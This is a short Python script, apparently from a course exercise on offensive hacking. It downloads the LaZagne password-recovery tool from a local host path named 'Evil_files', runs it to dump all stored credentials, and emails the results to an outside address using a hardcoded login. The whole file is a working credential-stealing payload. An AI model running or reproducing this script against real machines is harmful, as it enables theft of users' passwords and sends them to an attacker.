#!/usr/bin/env python

from Download_file import download
from Udemy.Execute_command import execute_command
import subprocess

download.download("http://10.0.2.15/Evil_files/lazagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
execute_command.send_email("brlt5@outlook.com", "3hQ8#9XTCNq$TWzPtR!c", result)